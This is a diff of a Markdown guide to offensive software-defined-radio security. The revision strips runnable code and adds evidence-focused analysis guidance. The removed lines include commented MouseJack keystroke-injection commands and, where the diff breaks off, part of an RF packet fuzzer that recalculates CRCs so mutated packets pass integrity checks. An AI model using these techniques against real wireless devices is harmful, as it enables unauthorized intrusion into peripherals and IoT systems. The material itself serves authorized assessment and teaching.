@@ -1,25 +1,27 @@
 # SDR Hacking Advanced: Reversing and Exploiting Wireless Communications
 
 ## 🎯 Purpose
-Advanced SDR security guide - extending sdr.md fundamentals with offensive techniques: SIGINT signal identification, GNU Radio flowgraph optimization, protocol reverse engineering with URH, LoRa key cracking, TEMPEST EM side-channel, firmware vulnerability analysis, and custom RF baseband exploitation.
+Advanced SDR security guide - extending sdr.md fundamentals with offensive techniques: SIGINT signal identification, GNU Radio flowgraph optimization, protocol reverse engineering with URH, LoRaWAN implementation review, TEMPEST EM side-channel, firmware vulnerability analysis, and custom RF baseband exploitation.
 
 ## ⚙️ Function
-Organized in four parts: (1) SIGINT, GNU Radio mastery, signal reversing; (2) Wireless protocol vulnerabilities (LoRa, Zigbee, BLE, NRF24, GPS spoofing); (3) Advanced exploitation (baseband firmware analysis, RF fuzzing, Unicorn/Qiling emulation, MouseJack); (4) TEMPEST and EM side-channel attacks. Each section includes practical GNU Radio flowgraphs, Python scripts, and real attack examples.
+Organized in four parts: (1) SIGINT, GNU Radio mastery, signal reversing; (2) Wireless protocol vulnerabilities (LoRa, Zigbee, BLE, NRF24, GPS spoofing); (3) Advanced exploitation (baseband firmware analysis, RF fuzzing, Unicorn/Qiling emulation, MouseJack); (4) TEMPEST and EM side-channel attacks. Sections distinguish conceptual mechanisms, source references and lab prerequisites. Unvalidated executable sketches have been replaced with analysis guidance; no hardware reproduction is claimed.
 
 ## 🏆 Goal
 Perform authorized RF security assessments against IoT, industrial, and wireless access control targets - capturing, reversing, and exploiting wireless protocols beyond what a basic SDR tutorial covers.
 
 ## 📋 When to Use
 - Protocol reversing: unknown wireless signal on 433MHz, 915MHz, or 2.4GHz requires identification and decoding
-- LoRa/Zigbee/BLE security assessment with need to test key derivation or key cracking
+- LoRaWAN/Zigbee/BLE security review with explicit protocol, version and provisioning evidence
 - TEMPEST/EM side-channel work on a hardware target with RF emissions
 - Advanced red-team: GPS spoofing, NRF24 MouseJack, or custom baseband exploitation
 
-> This guide tries to cover nearly every topic for SDR Hacking; from SIGINT identification techniques and GNU Radio flowgraph optimization through firmware vulnerability analysis, to custom RF baseband exploitation, LoRa key cracking, TEMPEST, and EM side-channel attacks.
+> **Review:** November 17, 2026. Source and visual review; no RF transmission, firmware emulation, side-channel acquisition or exploit reproduction performed.
 >
-> **Prerequisites assumed:** Linux proficiency, basic SDR/GNU Radio familiarity, security fundamentals. This guide extends (does not replaces) the General SDR.md section.
+> This guide tries to cover nearly every topic for SDR Hacking; from SIGINT identification techniques and GNU Radio flowgraph optimization through firmware vulnerability analysis, to custom RF baseband exploitation, LoRaWAN implementation review, TEMPEST, and EM side-channel attacks.
 >
-> **Legal notice:** All offensive techniques are presented for authorized security research, CTF competition, and defensive understanding only. Apply only against systems you own or have written authorization to test. RF transmission requires appropriate licensing. See [LEGAL.md](../LEGAL.md).
+> **Prerequisites assumed:** Linux proficiency, basic SDR/GNU Radio familiarity, security fundamentals. This guide extends (does not replace) the General SDR.md section.
+>
+> **Legal notice:** All offensive techniques are presented for authorized security research, CTF competition, and defensive understanding only. Apply only against systems you own or have written authorization to test. RF operating authority depends on jurisdiction, equipment and emissions; device ownership or an amateur license is not blanket authorization for arbitrary transmissions. See [LEGAL.md](../LEGAL.md).
 
 ---
 
@@ -52,7 +54,7 @@ Perform authorized RF security assessments against IoT, industrial, and wireless
 
 #### Wireless Connectivity - A Security Lens
 
-Every wireless system has four exploitable layers. Understanding which layer an attack targets is the foundation of wireless security assessment:
+The following four concerns are a useful analysis model, not an exhaustive protocol stack. Understanding which layer an attack targets is the foundation of wireless security assessment:
 
 | Layer | What It Controls | Attack Examples |
 |-------|-----------------|----------------|
@@ -69,16 +71,16 @@ The training CTF methodology mirrors this: start at the RF layer, work up throug
 
 | Modulation | Key Property | Security Implication |
 |-----------|-------------|---------------------|
-| **OOK/ASK** | On/off keying - simple amplitude shift | Trivial replay; no inherent authentication |
-| **FSK** | Two or more frequencies encode bits | Easy to decode; clock recovery straightforward |
-| **GFSK** | Gaussian-filtered FSK | Bluetooth, ZigBee; slight increase in decoder complexity |
+| **OOK/ASK** | On/off keying - simple amplitude shift | Modulation alone provides no authentication; replay acceptance is protocol-dependent |
+| **FSK** | Two or more frequencies encode bits | Requires appropriate filtering, frequency and symbol synchronization |
+| **GFSK** | Gaussian-filtered FSK | Used by Bluetooth and other radios; not the 2.4 GHz Zigbee O-QPSK PHY |
 | **PSK/BPSK/QPSK** | Phase shifts encode symbols | More complex sync; common in satellite, GPS, digital voice |
 | **QAM** | Combined amplitude + phase | Higher data rate; more sensitive to channel distortion |
 | **OFDM** | Many subcarriers; parallel symbol streams | Wi-Fi, LTE; complex; hard to implement custom attacks |
 | **DSSS** | Spread over wide bandwidth using PN code | GPS, 802.11b; PN code knowledge needed to decode |
 | **FHSS** | Rapid frequency hopping | Bluetooth Classic; requires clock/offset to follow |
 
-**Demodulation fingerprint:** Each modulation has a characteristic appearance on a waterfall and constellation plot. Training your eye to recognize these is the core SIGINT skill.
+**Demodulation fingerprint:** Waterfalls and constellations provide candidate hypotheses. Receiver settings, filtering, interference and synchronization affect their appearance; confirm with signal processing and protocol evidence.
 
 ```
 OOK:      Waterfall shows discrete blobs; no carrier when off
@@ -95,61 +97,25 @@ DSSS:     Noise-like; flat broad spectrum; looks like interference
 
 #### Encoding Review
 
-Bit encoding determines how raw data is converted to a bit stream. Protocol reversing requires identifying the encoding before the data makes sense.
+Line coding and framing are separate from modulation. NRZ-I polarity and Manchester
+bit conventions depend on the protocol; do not label one mapping universal.
+Manchester has a mid-bit transition, but simply grouping arbitrary samples into
+pairs does not recover clock, phase or polarity. 10BASE-T uses Manchester;
+differential Manchester is a distinct code. USB and 100BASE-TX should not be grouped
+as one 4B5B example.
 
-| Encoding | Description | How to Identify |
-|----------|-------------|----------------|
-| **NRZ (Non-Return to Zero)** | 1 = high, 0 = low; no transitions for same consecutive bits | DC bias; prone to synchronization loss on long runs |
-| **NRZ-I** | Transition on 1, no transition on 0 | USB, HDLC; more common in digital protocols |
-| **Manchester** | Transition in every bit period; 1 = high-to-low, 0 = low-to-high | Constant transitions; bandwidth = 2× bit rate |
-| **Differential Manchester** | Mid-bit transition always; edge at start encodes data | Ethernet 10BASE-T |
-| **4B5B** | Groups of 4 bits encoded as 5-bit symbols | USB, 100BASE-TX; output always has ≤3 consecutive same bits |
-| **8B10B** | 8 data bits → 10 line bits | SATA, Fibre Channel; DC balance maintained |
-| **UART framing** | Start bit + data bits + [parity] + stop bit(s) | Asynchronous; identifies as OOK-like bursts |
+| Concern | Evidence needed |
+|---|---|
+| Bit timing | Estimated symbol period and a clock-alignment method. |
+| Coding | Known test pattern, documented convention and invalid-symbol handling. |
+| Framing | Preamble, synchronization and length rules across complete messages. |
+| Data interpretation | Controlled input changes and independent documentation. |
 
-**Detecting Manchester encoding:**
-
-```python
-import numpy as np
-
-def detect_manchester(bits, tolerance=0.1):
-    """
-    Check if a bit stream uses Manchester encoding.
-    Manchester: every bit period has exactly one transition.
-    """
-    # Count transitions per symbol period
-    # Assumes already at 2x oversampling (2 samples per bit)
-    transitions = []
-    for i in range(0, len(bits) - 1, 2):
-        pair = bits[i:i+2]
-        # Manchester: valid pairs are [1,0] (bit=1) or [0,1] (bit=0)
-        if list(pair) in [[1, 0], [0, 1]]:
-            transitions.append(1)
-        else:
-            transitions.append(0)
-    
-    transition_rate = sum(transitions) / len(transitions)
-    return transition_rate > (1 - tolerance)
-
-def decode_manchester(bits):
-    """Decode Manchester-encoded bit stream to data bits"""
-    decoded = []
-    for i in range(0, len(bits) - 1, 2):
-        if bits[i] == 1 and bits[i+1] == 0:
-            decoded.append(1)  # High-to-low = 1 (IEEE 802.3)
-        elif bits[i] == 0 and bits[i+1] == 1:
-            decoded.append(0)  # Low-to-high = 0
-        else:
-            # Sync or error
-            decoded.append(-1)
-    return decoded
-```
-
----
+The previous pair-only decoder was not a general encoding detector and is omitted.
 
 #### Integrity and Encryption in Wireless Protocols
 
-Most consumer wireless protocols use weak or no integrity protection. Understanding what's actually being protected (and what isn't) is critical for attack planning.
+Wireless protocols differ in integrity and confidentiality protection. Assess the exact implementation rather than inferring security from a consumer or industrial label. Understanding what's actually being protected (and what isn't) is critical for attack planning.
 
 **Common integrity mechanisms:**
 
@@ -159,8 +125,8 @@ Most consumer wireless protocols use weak or no integrity protection. Understand
 | **CRC-8/16/32** | Error detection only; no authentication | Many ISM devices | CRC is easily recalculated for modified data |
 | **Rolling code (KeeLoq)** | Pseudo-random code sequence | Car keyfobs | MitM capture + resync attacks; KeeLoq cryptanalysis |
 | **CMAC / HMAC** | Strong if key is protected | Modern IoT | Key extraction via side-channel or firmware |
-| **AES-CCM / AES-GCM** | Strong | ZigBee, Bluetooth, LoRa | IV/nonce reuse; key management failures |
-| **Proprietary cipher** | Often weak | Industrial, custom | Reverse engineer cipher; often linear or trivially breakable |
+| **AES-CCM / AES-GCM** | Strong | Zigbee and Bluetooth use cases; LoRaWAN has its own specified construction | IV/nonce reuse; key management failures |
+| **Proprietary cipher** | Implementation-dependent | Industrial, custom | Reverse engineer cipher; evaluate independently; secrecy alone is not assurance |
 
 ---
 
@@ -168,61 +134,45 @@ Most consumer wireless protocols use weak or no integrity protection. Understand
 
 #### Spectrum and Signal Analyzers
 
-Beyond SDRs, dedicated spectrum analyzers provide higher dynamic range, real-time capture, and calibrated measurements for professional RF assessment.
+Spectrum analyzers, SDR receivers and vector network analyzers answer different questions.
+A VNA measures reflection/transmission against a calibrated reference; it is not a
+spectrum receiver. Swept coverage, instantaneous capture bandwidth and resolution
+bandwidth are different quantities. Prices and model-specific bandwidths are omitted
+rather than treated as stable specifications.
 
-| Device | Range | Real-Time BW | Cost | Notes |
-|--------|-------|-------------|------|-------|
-| **TinySA Ultra** | 100 kHz–5.3 GHz | ~800 kHz | ~$110 | Portable; handheld; good for field work |
-| **NanoVNA** | 10 kHz–1.5 GHz | Swept | ~$50 | Vector network analyzer; characterize filters and antennas |
-| **Signal Hound BB60C** | 9 kHz–6 GHz | 27 MHz RBW | ~$2,900 | Professional; software defined |
-| **Rohde & Schwarz FPC1500** | 5 kHz–3 GHz | 10 MHz | ~$3,500 | Benchtop; high accuracy |
-| **RIGOL DSA815** | 9 kHz–1.5 GHz | Swept | ~$1,200 | Accessible benchtop option |
+| Instrument family | Measurement role | Boundary to verify |
+|---|---|---|
+| TinySA / swept spectrum analyzers | Survey power versus frequency | Actual model, input limits, sweep time and calibration. |
+| NanoVNA | Antenna, cable and filter impedance / transfer measurements | Calibration plane and supported range; see [NanoVNA guide](./nanovna/README.md). |
+| SDR receivers / streaming analyzers | Record a supported instantaneous span | Sample rate, analog filters, host throughput and dropped samples. |
+| Laboratory spectrum / signal analyzers | Model-specific calibrated measurements | Option licenses, bandwidth definitions, detector settings and input limits. |
 
-**TinySA Ultra** is the practical field tool - pair it with your SDR for initial site survey and signal characterization before committing capture bandwidth.
-
-```
-TinySA Ultra workflow:
-1. Sweep target band → identify occupied channels
-2. Measure signal level (dBm) and approximate bandwidth
-3. Tune SDR to most interesting frequency
-4. Capture IQ for analysis
-```
+Begin with an instrument-appropriate baseline, record settings, and keep a sweep
+distinct from simultaneous IQ recording.
 
 #### Special RF Chips and Their Attack Surface
 
-RF SoCs (System-on-Chip) integrate the entire radio stack - from RF front end through baseband processing to microcontroller. Vulnerabilities at the chip level affect every device using that silicon.
+A radio chip does not establish a whole product's protocol or vulnerability.
+Transceivers, SoCs and host-controlled frontends have different responsibilities.
 
-| Chip | Protocol | Used In | Known Issues |
-|------|---------|---------|-------------|
-| **TI CC1101** | Sub-GHz FSK/OOK | ISM devices, meters, alarms | No encryption standard; OTA programming mode |
-| **TI CC2500** | 2.4 GHz FSK | RC controllers, mice, keyboards | MouseJack attack surface |
-| **TI CC2530/31** | ZigBee/IEEE 802.15.4 | Smart home, industrial | ZigBee key transport weaknesses |
-| **Nordic nRF24L01** | 2.4 GHz proprietary | Wireless keyboards, mice, drones | MouseJack; ShockBurst protocol weaknesses |
-| **Nordic nRF52** | BLE | IoT, wearables | OTA DFU vulnerabilities; GATT exploit surface |
-| **Silicon Labs EFR32** | Multi-protocol | Smart home | ZigBee/BLE stack CVEs |
-| **Semtech SX1276** | LoRa | LoRaWAN devices | Key management; replay; join accept forgery |
-| **ESP8266/ESP32** | Wi-Fi + BLE | DIY IoT everywhere | Known RCEs in SDK history; often no OTA signing |
+| Family | Useful distinction |
+|---|---|
+| CC1101 / CC2500 / nRF24 | Packet-radio frontends; host firmware and exact configuration determine application security. |
+| CC253x / EFR32 / nRF52 | Hardware and firmware combinations support different protocol stacks; check the selected part and build. |
+| SX127x | LoRa-capable transceiver family; LoRaWAN state and keys are not properties of every LoRa waveform. |
+| ESP8266 / ESP32 | Variant-specific Wi-Fi/Bluetooth capabilities; not every ESP32 family member supports the same radios. |
 
-**MouseJack - nRF24L01 attack:**
-
-```python
-# MouseJack exploits the nRF24L01's Enhanced ShockBurst protocol
-# Many wireless keyboards/mice accept unencrypted packets injected 
-# from any device broadcasting on the same address
-
-# Tools: 
-# CrazyRadio PA (nRF24LU1 USB dongle) + Bastille's MouseJack tools
-# pip install pynput
-
-# Basic scan for vulnerable devices
-# mousejack scan     # Scan for vulnerable devices
-# mousejack sniff [addr]   # Passive sniff specific device
-# mousejack inject [addr] [HID payload]  # Inject keystrokes (authorized only)
-```
-
----
+MouseJack is historical research against particular non-Bluetooth peripheral
+implementations, not proof that every Enhanced ShockBurst device accepts arbitrary
+keyboard input. Use the [original research](https://github.com/BastilleResearch/mousejack)
+to establish the studied products and conditions; the former generic `mousejack`
+CLI strings were not a validated procedure.
 
 ### Chapter 3: SIGINT - Identifying Targeted Transmissions
+
+![Recordings, characterization, protocol interpretation and validated behavior require separate evidence](../assets/diagrams/advanced-sdr-evidence-ladder.svg)
+
+*Figure 1 — Original conceptual diagram. Metadata context follows [SigMF](https://sigmf.org/); the evidence ladder is an engineering interpretation, not a measured accuracy result.*
 
 SIGINT (Signals Intelligence) in the SDR context means rapidly characterizing unknown signals in a dense RF environment - determining what you're looking at before investing in deep analysis.
 
@@ -282,52 +232,19 @@ Step 3: Look at temporal behavior
 
 **Inspectrum** - Primary tool for visual binary analysis:
 
-```bash
-sudo apt install inspectrum
-inspectrum capture.iq
-
-# Inspectrum key features:
-# - Adjustable sample rate and time zoom
-# - Symbol extraction: click threshold to get binary output
-# - Symbol period detection via autocorrelation
-# - Export symbols to file for further analysis
-```
+For inspectrum, confirm the capture representation and sample rate before measuring pulse timing. Save the selected interval and analysis notes with an unmodified original recording.
 
 **SigDigger** - Signal analyzer with demodulation:
 
-```bash
-# Install from: https://github.com/BatchDrake/SigDigger
-# Provides:
-#   - Wideband spectrum + waterfall
-#   - Click-to-demodulate: point at any signal; choose demod type
-#   - Channel recording
-#   - Doppler tracking
-```
+For SigDigger, validate device/input support in the chosen build. Treat demodulated audio or decoded structure as an analysis result with recorded settings, not automatic signal attribution.
 
 **Universal Radio Hacker (URH)** - The primary protocol reversing tool:
 
-```bash
-pip install urh
-urh
-
-# URH workflow:
-# 1. File → Open IQ file (or live capture via SDR)
-# 2. Signal tab: adjust modulation type and parameters; view bits
-# 3. Analysis tab: automatic protocol analysis; find preamble/sync
-# 4. Generator tab: create and transmit modified packets (authorized only)
-# 5. Simulator tab: multi-device protocol simulation
-```
+Use a version-matched [URH build and documentation](https://github.com/jopohl/urh). The upstream project is archived as of this review; internal Python APIs and installation commands are not a compatibility guarantee. Preserve input format, rate and alignment when comparing decoded fields.
 
 **Baudline** - High-resolution spectral analysis:
 
-```bash
-# Baudline is a standalone binary; download from baudline.com
-# Key capabilities:
-#   - Very high FFT resolution (up to 2M points)
-#   - Frequency and time domain views simultaneously  
-#   - Phase display; group delay
-#   - Excellent for manual modulation identification
-```
+For Baudline, use a supported input representation and document spectral scaling. A visible feature alone does not identify its protocol or provide calibrated RF power.
 
 ---
 
@@ -337,170 +254,35 @@ Automated signal classification using ML has become practical for SIGINT workflo
 
 **RadioML dataset and models:**
 
-The RadioML 2018.01A dataset (DeepSig) contains 24 modulation classes captured under realistic channel conditions. Pre-trained models achieve ~90%+ classification accuracy.
+RadioML releases are research benchmarks with version-specific classes and impairment models; they are not a substitute for a representative deployment test. Published scores depend on the exact dataset, split, SNR, impairments and model. They are not a field-accuracy guarantee.
 
-```python
-import numpy as np
-import torch
-import torch.nn as nn
-
-class RadioMLClassifier(nn.Module):
-    """
-    Simplified CNN for radio modulation classification.
-    Input: (batch, 2, 1024) - I and Q as two channels.
-    Output: class probabilities for modulation types.
-    """
-    def __init__(self, n_classes=11):
-        super().__init__()
-        self.conv_stack = nn.Sequential(
-            nn.Conv1d(2, 64, kernel_size=3, padding=1),
-            nn.ReLU(),
-            nn.Conv1d(64, 64, kernel_size=3, padding=1),
-            nn.ReLU(),
-            nn.MaxPool1d(2),
-            nn.Conv1d(64, 128, kernel_size=3, padding=1),
-            nn.ReLU(),
-            nn.Conv1d(128, 128, kernel_size=3, padding=1),
-            nn.ReLU(),
-            nn.MaxPool1d(2),
-        )
-        self.classifier = nn.Sequential(
-            nn.Flatten(),
-            nn.Linear(128 * 256, 256),
-            nn.ReLU(),
-            nn.Dropout(0.5),
-            nn.Linear(256, n_classes),
-        )
-    
-    def forward(self, x):
-        return self.classifier(self.conv_stack(x))
-
-# Modulation classes
-MOD_CLASSES = ['OOK', 'ASK4', 'ASK8', 'BPSK', 'QPSK', '8PSK',
-               'QAM16', 'QAM64', 'WBFM', 'AM-DSB', 'AM-SSB']
-
-def classify_signal(iq_samples, model, n_samples=1024):
-    """Classify modulation type from IQ samples"""
-    # Take a chunk from the middle of the capture
-    start = len(iq_samples)//2 - n_samples//2
-    chunk = iq_samples[start:start + n_samples]
-    
-    # Normalize
-    chunk = chunk / (np.std(chunk) + 1e-8)
-    
-    # Format as (2, N) tensor
-    x = torch.tensor(
-        np.stack([chunk.real, chunk.imag], axis=0),
-        dtype=torch.float32
-    ).unsqueeze(0)  # Add batch dimension
-    
-    with torch.no_grad():
-        logits = model(x)
-        probs = torch.softmax(logits, dim=1)[0]
-    
-    top3 = torch.topk(probs, 3)
-    results = []
-    for prob, idx in zip(top3.values, top3.indices):
-        results.append((MOD_CLASSES[idx], prob.item()))
-    
-    return results
-
-# Usage:
-# model = RadioMLClassifier()
-# model.load_state_dict(torch.load('radioml_weights.pt'))
-# print(classify_signal(iq_samples, model))
-```
+A classifier requires matched training labels, normalization, sample length and trained weights. Report held-out performance by SNR and capture domain, include an unknown/out-of-distribution outcome, and do not describe untrained logits as calibrated probabilities.
 
 **gr-inspector** - GNU Radio module for automated signal detection and classification:
 
-```bash
-# Install gr-inspector
-sudo apt install gnuradio-inspector  # or build from source
-# Provides GNU Radio blocks:
-#   - Signal Detector: finds signal edges in spectrum
-#   - Feature Extraction: extracts classification features
-#   - Modulation Classifier: ML-based mod type identification
-```
+For gr-inspector, match the GNU Radio and module versions, then evaluate supported detector/classifier behavior on labeled recordings. Record misses and ambiguous classifications before applying it to an unknown signal.
 
 **SigMF (Signal Metadata Format)** - Standardized format for annotating IQ captures:
 
-```python
-import sigmf
-from sigmf import SigMFFile
-from datetime import datetime
-
-# Annotate a capture with signal metadata
-meta = SigMFFile(
-    data_file='capture.iq',
-    global_info={
-        SigMFFile.DATATYPE_KEY: 'cf32_le',       # complex float32, little-endian
-        SigMFFile.SAMPLE_RATE_KEY: 2400000,
-        SigMFFile.DESCRIPTION_KEY: 'ISM band capture - keyfob analysis',
-        SigMFFile.AUTHOR_KEY: 'PNWC Red Team',
-        SigMFFile.DATETIME_KEY: datetime.utcnow().isoformat(),
-    }
-)
-
-# Add capture annotation (what was seen)
-meta.add_annotation(
-    start_index=100000,
-    length=50000,
-    metadata={
-        SigMFFile.FQN_KEY: 'core:annotation',
-        'core:label': 'keyfob_burst',
-        'core:comment': 'Button press #1; OOK; ~4 kHz bandwidth; 433.92 MHz',
-        'hw:frequency': 433920000,
-        'hw:modulation': 'OOK',
-    }
-)
-
-meta.tofile('capture.sigmf-meta')
-```
+Record sample datatype and rate in SigMF global metadata; record tuning/time at capture boundaries and labels/sample spans as annotations. Validate against the [SigMF schema](https://sigmf.org/); arbitrary `hw:` fields require a declared extension. Metadata describes the sample file and does not convert it.
 
 ---
 
 #### Building a SIGINT Analysis Environment
 
-```bash
-#!/bin/bash
-# SIGINT toolchain setup
-
-# Core SDR
-sudo apt install -y gnuradio gr-osmosdr rtl-sdr hackrf
-
-# Signal analysis
-sudo apt install -y inspectrum gqrx-sdr
-pip install urh sigMF
-
-# Visualization
-pip install matplotlib numpy scipy pyrtlsdr
-
-# Protocol databases
-sudo apt install -y rtl-433  # 200+ ISM device protocols
-
-# ML signal classification
-pip install torch torchvision
-# Download RadioML dataset: https://www.deepsig.ai/datasets
-
-# Custom GNU Radio modules
-# gr-inspector (signal detection)
-git clone https://github.com/gnuradio/gr-inspector
-cd gr-inspector && mkdir build && cd build
-cmake .. && make -j4 && sudo make install
-
-# JAERO (ACARS/aviation data)
-# QSpectrumAnalyzer (spectrum monitoring)
-# SDRAngel (comprehensive SDR platform with many decoders)
-pip install sdrangel || sudo snap install sdrangel
-```
+Build the environment around a preserved sample file, its validated SigMF metadata, a reproducible tool/version inventory and a separate results directory. Test importing a known sample before interpreting an unknown recording.
 
 ---
 
 ### Chapter 4: GNU Radio - Advanced Flowgraphs
 
+![The receive stream branches into separate terminal display and file sinks after filtering and decimation](../assets/diagrams/advanced-sdr-dsp-branching.svg)
+
+*Figure 2 — Original conceptual wiring diagram. Compare actual block interfaces and item types with the [GNU Radio source](https://github.com/gnuradio/gnuradio); this is not a tested flowgraph for a specific release.*
+
 #### Building a Signal Analyzer Flowgraph
 
-A comprehensive analyzer flowgraph goes beyond a simple spectrum display - it provides synchronized time, frequency, constellation, and power views:
+A multi-view analyzer can display time, frequency, constellation and envelope information. Shared input does not imply that every display is time-aligned or calibrated:
 
 ```
 [osmocom Source]
@@ -512,11 +294,10 @@ A comprehensive analyzer flowgraph goes beyond a simple spectrum display - it pr
 (Full spectrum view)                    │
                                         ▼
                                [QT GUI Waterfall Sink]
-                               (Time-frequency history)
-                                        │
-                               [Complex to Mag²]
-                                        ▼
-                               [QT GUI Time Sink]
+                               (terminal visualization)
+
+Branch the resampler output separately:
+  [Resampler] → [Complex to Mag²] → [QT GUI Time Sink]
                                (Power envelope vs time)
 ```
 
@@ -526,7 +307,7 @@ In GRC, add a QT GUI Range block:
 - ID: `center_freq`
 - Label: Center Frequency
 - Default: 433920000
-- Min: 1000000 / Max: 6000000000
+- Min/Max: constrain to the selected radio, frontend and antenna
 - Step: 100000
 - Widget: Counter + Slider
 
@@ -544,37 +325,13 @@ For testing demodulators and decoders against realistic impairments, GNU Radio's
 
 | Block | Simulates | Key Parameters |
 |-------|----------|---------------|
-| **AWGN** | Additive white Gaussian noise | Noise voltage = √(SNR) |
+| **AWGN** | Additive white Gaussian noise | Noise power from signal power / linear SNR |
 | **Selective Fading** | Multipath; Rayleigh/Rician fading | Delay spread, Doppler, fading type |
 | **Phase Noise** | Local oscillator phase noise | Phase noise PSD |
 | **Frequency Offset** | Carrier frequency offset | ppm error |
 | **Timing Error** | Clock offset between TX and RX | Parts-per-million drift |
 
-```python
-# Python equivalent: add noise to test your decoder
-import numpy as np
-
-def add_awgn(signal, snr_db):
-    """Add AWGN noise to complex baseband signal"""
-    signal_power = np.mean(np.abs(signal)**2)
-    noise_power = signal_power / (10**(snr_db/10))
-    noise = np.sqrt(noise_power/2) * (
-        np.random.randn(len(signal)) + 1j * np.random.randn(len(signal))
-    )
-    return signal + noise
-
-def add_freq_offset(signal, offset_hz, sample_rate):
-    """Simulate carrier frequency offset"""
-    t = np.arange(len(signal)) / sample_rate
-    return signal * np.exp(2j * np.pi * offset_hz * t)
-
-def add_phase_noise(signal, phase_noise_std=0.01):
-    """Simulate local oscillator phase noise"""
-    phase_noise = np.random.randn(len(signal)) * phase_noise_std
-    # Cumulative phase (integrated noise)
-    cum_phase = np.cumsum(phase_noise)
-    return signal * np.exp(1j * cum_phase)
-```
+For a complex signal with measured mean power (P_s), a target linear SNR implies noise power (P_n=P_s/SNR); independent I/Q Gaussian components each have variance (P_n/2). Keep normalization and units explicit, record random seeds, and distinguish this synthetic model from a measured RF channel.
 
 #### Reversing Analog and Digital Communications in GNU Radio
 
@@ -594,7 +351,7 @@ Flowgraph 2: Try FM demodulation
 
 Flowgraph 3: Extract and analyze content
   [File Source] → [NBFM Receive] → [File Sink (float)]
-  Then analyze audio WAV for hidden data (sub-tones, DTMF, data beneath voice)
+  Use a WAV sink or explicitly convert raw float audio, then analyze the resulting WAV for hidden data (sub-tones, DTMF, data beneath voice)
 ```
 
 **CTF-style digital reversing workflow:**
@@ -604,7 +361,7 @@ Scenario: Captured burst signal; appears FSK; unknown protocol.
 
 Step 1: Measure symbol rate
   [File Source] → [Complex to Mag²] → [QT GUI Frequency Sink]
-  Peak in power spectrum of |IQ|² = symbol rate
+  Power-spectrum features may suggest periodicity; they do not universally equal symbol rate
 
 Step 2: Demodulate to bits
   [File Source] → [Quadrature Demod] → [Binary Slicer] → [File Sink (byte)]
@@ -629,30 +386,18 @@ Real-time processing of high-sample-rate data challenges CPU performance. Optimi
 
 ```
 BAD:  [Source @ 2.4MSa/s] → [many blocks] → [Decimator at end]
-GOOD: [Source @ 2.4MSa/s] → [Decimator] → [blocks at 240kSa/s]
+GOOD: [Source @ 2.4MSa/s] → [Anti-alias filter + decimator] → [blocks at 240kSa/s]
 ```
 
 **Multithreading in GNU Radio:**
 
-```python
-# In GRC Python: enable multithreaded scheduler
-# Edit generated Python script:
-tb.start()
-# Change to:
-tb.start(max_noutput_items=1000)  # Tune buffer size
-
-# Or use GNU Radio's parallel scheduler:
-# In .grc file, set thread_safe_setters = True for variable blocks
-```
+Scheduler buffer limits are not a switch enabling parallel execution. Profile the actual GNU Radio release and flowgraph, then tune buffers and thread placement against measured throughput and latency. Do not treat `thread_safe_setters` as a general parallel-scheduler option.
 
 **VOLK (Vector Optimized Library of Kernels):**
 
 GNU Radio uses VOLK to automatically select SIMD-optimized implementations (SSE, AVX, NEON) for DSP operations. Run the alignment tool once per machine:
 
-```bash
-volk_profile    # Benchmarks and selects optimal SIMD kernels; run once
-# Results saved to ~/.volk/volk_config
-```
+Use the installed VOLK documentation for kernel profiling. Profiling selects implementations for that machine; repeat after material software or hardware changes rather than assuming a permanent optimum.
 
 ---
 
@@ -662,44 +407,11 @@ volk_profile    # Benchmarks and selects optimal SIMD kernels; run once
 
 **rtl_433 - protocol decoder:**
 
-```bash
-# Decode 200+ known ISM protocols; output unknown ones in raw form
-rtl_433 -f 433.92M -A   # Pulse analyzer mode; shows OOK timing even for unknown signals
-
-# JSON output for scripting
-rtl_433 -f 433.92M -F json 2>/dev/null | python3 -c "
-import sys, json
-for line in sys.stdin:
-    try:
-        d = json.loads(line)
-        print(f\"{d.get('model','?')}: {d}\")
-    except: pass
-"
-
-# Analyze a captured file
-rtl_433 -r capture.cu8 -A   # cu8 = unsigned 8-bit IQ from rtl_sdr
-```
+Use [rtl_433's upstream input/output documentation](https://github.com/merbanan/rtl_433) and the [receive-only lab](./rtl433-passive-telemetry-lab.md). The analyzer can report candidate pulse structure, while decoded JSON depends on enabled supported decoders. A fixed protocol count or silent output is not an identification guarantee.
 
 **URH automation - scripting protocol analysis:**
 
-```python
-# URH can be driven programmatically for automated analysis
-from urh.signalprocessing.Signal import Signal
-from urh.signalprocessing.ProtocolAnalyzer import ProtocolAnalyzer
-from urh.util.WSPDecoder import WSPDecoder
-
-# Load captured IQ
-signal = Signal("capture.complex", name="keyfob", sample_rate=2e6)
-signal.modulation_type = "FSK"
-signal.bit_length = 200   # Samples per bit (adjust to match)
-
-# Decode to bit strings
-pa = ProtocolAnalyzer(signal)
-pa.get_protocol_from_signal()
-
-for msg in pa.messages:
-    print(msg.plain_bits_str)
-```
+An automation workflow must pin the installed URH version, identify its supported interface and verify results against known inputs. An internal Python method name copied from another build is not a stable API contract.
 
 #### Dumb Fuzzing of Communications
 
@@ -726,89 +438,7 @@ Dumb fuzzing applies random mutations to known-good packets and transmits them t
 (Crash? Different response? Error message on UART?)
 ```
 
-```python
-import random
-import struct
-import numpy as np
-
-class RFPacketFuzzer:
-    def __init__(self, baseline_packet: bytes):
-        self.baseline = bytearray(baseline_packet)
-        self.mutations_applied = []
-    
-    def bitflip(self, packet: bytearray, n_bits: int = 1) -> bytearray:
-        """Flip n random bits"""
-        mutated = bytearray(packet)
-        for _ in range(n_bits):
-            byte_idx = random.randint(0, len(mutated) - 1)
-            bit_idx = random.randint(0, 7)
-            mutated[byte_idx] ^= (1 << bit_idx)
-        return mutated
-    
-    def byte_substitute(self, packet: bytearray, 
-                         field_start: int, field_end: int) -> bytearray:
-        """Replace bytes in a specific field with random values"""
-        mutated = bytearray(packet)
-        for i in range(field_start, field_end):
-            mutated[i] = random.randint(0, 255)
-        return mutated
-    
-    def length_mutation(self, packet: bytearray, 
-                         length_field_offset: int, 
-                         field_size: int = 1) -> bytearray:
-        """Corrupt the length field - common parser bug trigger"""
-        mutated = bytearray(packet)
-        # Try extreme values: 0, max, max+1, actual+large
-        extreme_lengths = [0, 0xFF, 0xFFFF, len(packet) + 100, 0]
-        new_len = random.choice(extreme_lengths)
-        
-        if field_size == 1:
-            mutated[length_field_offset] = new_len & 0xFF
-        elif field_size == 2:
-            struct.pack_into('>H', mutated, length_field_offset, new_len & 0xFFFF)
-        return mutated
-    
-    def recalculate_crc(self, packet: bytearray, 
-                          crc_offset: int, data_start: int, data_end: int):
-        """Recalculate CRC so mutated packet passes integrity check"""
-        import crcmod
